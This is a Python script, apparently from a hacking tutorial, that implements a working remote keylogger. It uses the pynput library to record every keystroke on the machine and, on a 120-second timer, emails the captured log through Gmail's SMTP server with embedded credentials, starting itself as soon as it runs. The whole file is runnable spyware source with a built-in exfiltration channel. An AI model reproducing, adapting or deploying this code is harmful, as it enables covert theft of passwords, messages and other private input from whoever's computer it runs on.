#!/usr/bin/env python
# local keyloggers - stores locally
# remote keyloggers - sends to remote server or email

# pynput library allows us to monitor mouse/keyboard and also CONTROL the mouse, keyboard - so you can even send keystrokes
import pynput.keyboard
import threading
import smtplib

class Keylogger:
       
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password
        
    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            # key.char prints only h instead of 'h'
            current_key = str(key.char)
        except AttributeError:
            # except needed since keys like space etc. dont have any attribute called char
            if key == key.space:
                current_key = " "
            else:
               current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    # to do reporting we'll have to use threading because we want to run reporting and logging simultaneously
    def report(self):
        #print(self.log)
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        # googles server that runs on 587
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        # from to message
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        # on_press is used to give callback function for every key press
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        # below code starts the listener - .join()
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
            
my_keylogger = Keylogger(120, "email", "<Enter password>")
my_keylogger.start()
